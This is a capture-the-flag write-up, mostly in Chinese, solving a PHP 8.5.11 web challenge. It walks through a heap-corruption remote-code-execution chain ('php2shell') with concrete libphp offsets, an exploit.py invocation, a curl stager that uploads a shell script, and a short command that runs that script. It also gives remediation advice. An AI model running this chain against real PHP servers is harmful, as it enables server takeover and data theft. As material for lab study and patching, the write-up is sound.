# Ingest Journal

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-554FE55A` · 状态 solved
```

## 一句话

A small journal service has stopped accepting imports after its worker began behaving strangely.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-554FE55A.zip` | 2.4 KB | `80f79c77fe18…` |
| `zip/service.Dockerfile` | 347 B | `f170990943dd…` |
| `zip/README.txt` | 174 B | `b3e6721eabef…` |
| `zip/index.html` | 533 B | `22869caccc3a…` |
| `zip/recipe.php` | 490 B | `d9c3b55d6e39…` |
| `zip/configuration.txt` | 147 B | `c719a8684887…` |
| `zip/php.ini` | 574 B | `9076ce32da19…` |
| `zip/apache.conf` | 479 B | `67f7151c4226…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 结果

• 入口：http://<instance>/（index.html）与 POST /recipe.php
• 结论：应用层没有可达的读/执行点，真正的入口是 php2shell（PHP 8.5.11 + mod_php + prefork 单 worker 的堆破坏链）；recipe.php 是 stager，sh</tmp/x 是那把 14 字节的钥匙
• FLAG：«FLAG»

### 1. 题面与附件

题面只说“worker 行为异常、导入队列关闭，操作员在运行中的容器里留了 secret”。附件 AUTHORED-554FE55A.zip 是源码披露包：

| 文件 | 关键内容 |
| --- | --- |
| recipe.php | POST 正文 ≤1024B、不含 NUL，写入 /tmp/x；从不 include/执行 |
| index.html | 说明 /healthz.txt 与导出目录 /publish/receipts/daily/open/ |
| apache.conf | AddOutputFilter Sed php + OutputSed "s/./ /g"；prefork 单 worker、KeepAlive Off；注释直写 php2shell: deterministic heap grooming |
| php.ini | memory_limit=8M、post_max_size=64M、session.upload_progress=On、session.save_path=/tmp、PHP 8.5 only、fatal_error_backtraces=On |
| service.Dockerfile | FROM php:8.5.11-apache；ln -s /answers/flag /flag；/var/www/html/publish/receipts/daily/open 权限 1777 |
| README.txt | flag 只在实例启动时生成，附件里没有 |

### 2. 第一眼信号（30 秒）

三个信号叠在一起，方向就定了：

• php:8.5.11-apache —— 低于修复版 8.5.12，落在公开的 PHP2Shell 影响面里（CVE-2026-109618 / CVE-2026-109619）；
• 单 worker + KeepAlive Off + 小堆（8M）+ session.upload_progress —— 让 heap grooming 变得“确定性”的标准配置；
• apache.conf 注释直接写 php2shell，等于把预期解法写在题面上。

recipe.php 写 /tmp/x 是诱饵：它自己不执行；但它把任意 ≤1024 字节的内容放进了容器，这正好是后面那条 14 字节命令的 stager。

### 3. 失败路径

| 假设 | 做了什么 | 结果 | 为什么失败 |
| --- | --- | --- | --- |
| 上传的 recipe 会被执行 | POST 一段 PHP 到 recipe.php | 只有 saved | 源码只 file_put_contents('/tmp/x')，没有任何 include |
| 从 /tmp/x 回读 | 请求 /tmp/x、/x | 404 | 只有 publish/receipts/daily/open 在 DocumentRoot 下 |
| 让 PHP 输出 flag | 各种报错/回显 | 全是空格 | OutputSed "s/./ /g" 把 PHP 输出逐字符替换 |

### 4. 有效路径：php2shell 三阶段

整条链与 ExtStore 同族（同为 php:8.5.11-apache）：

1. stage 1：A 请求用 multipart/form-data + PHP_SESSION_UPLOAD_PROGRESS 造临时 Zend 结构，再用大于 memory_limit 的 big 字段把请求推过 OOM 边界，让清理路径留下可复用的堆布局；B 请求伪造 zend_string.len，从 Set-Cookie 里越界读回 Zend MM chunk base。
2. stage 2：同样手法把 zval_ptr_dtor 的地址读进 cookie，按偏移反推 libphp base。
3. stage 3：伪造 HashTable，把 pDestructor 改成 zif_system，伪造 execute_data，在销毁 session 变量时执行 system(cmd)。

本题可用的偏移（与 ExtStore 相同镜像）：

| 名称 | 值 | 用途 |
| --- | --- | --- |
| ZIF | 0x5996e0 | zif_system 相对 libphp 的偏移 |
| DTOR | 0x7b47a0 | zval_ptr_dtor 相对 libphp 的偏移 |

堆布局用 8.5.11-bookworm-amd64 profile；memory_limit=8M 下 OOM 仍由 12MiB 的 big 字段触发（--huge 12），入口换成 POST /recipe.php（唯一会完整解析 multipart 的端点）。

命令长度受承载 fake HashTable 的 167 字节 zend_string 限制：

# _dl/php2shell/exploit.py:50

```
MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL
```

### 5. 14 字节怎么够：把 recipe 当 stager

sh</tmp/x 只有 8 字节：zif_system 走 /bin/sh -c，重定向把 /tmp/x 当成脚本喂给 shell。于是：

1. 先 POST /recipe.php 写入一段 shell 脚本（≤1024B，无 NUL）：

```js
#!/bin/sh
cat /answers/flag > /var/www/html/publish/receipts/daily/open/flag.txt
chmod 644 /var/www/html/publish/receipts/daily/open/flag.txt
```

2. 再用 php2shell 执行 sh</tmp/x。
3. 脚本把 flag 落到 publish/receipts/daily/open（1777，正好是 index.html 给出的导出目录）。

注意最后一步用 .txt 静态文件取回：AddOutputFilter Sed php 只作用于 php handler 的输出，静态文件不经过 OutputSed，所以不会被打成空格。

### 6. 复现

# 1) stager

```bash
curl -s -X POST --data-binary @stage.sh http://<instance>/recipe.php
```

# 2) php2shell

```bash
python _dl/php2shell/exploit.py \
```

-u http://<instance>/recipe.php \

-c 'sh</tmp/x' \

--profile official \

--zif-offset 0x5996e0 --dtor-offset 0x7b47a0 \

--huge-mb 12 --retries 5

# 3) 取回

```bash
curl -s http://<instance>/publish/receipts/daily/open/flag.txt
```

### 7. flag 与验证

«FLAG»

平台提交 correct=true；同一个 flag.txt 在容器生命周期内可重复读取，sha256 与平台 flag 一致。

### 8. 修复建议

• 升级到 php:8.5.12-apache 以上（CVE-2026-109618/109619 的修复版）；
• 不要把答案放进 web 进程可读的路径，/answers 不应被 worker 用户读取；
• 任何“可写目录 + 可执行解释器”的组合都是 stager：/tmp 与 webroot 的 1777 目录应分开授权，且不要给 web 用户执行 shell 的权限。

一句话：题面把“配置即漏洞”写得很直白——php.ini/apache.conf 给齐了 php2shell 的触发条件，recipe.php 的写文件端点白送一个 stager，sh</tmp/x 把 14 字节的上限绕开，最后用静态目录逃掉输出过滤。

## 结果

- flag sha256：`1bc3c40d9a2a7a3a513fba1c495d83b7e2f8e97cf8a1c819aa87cef310d1863b`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 1 节《Ingest Journal》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
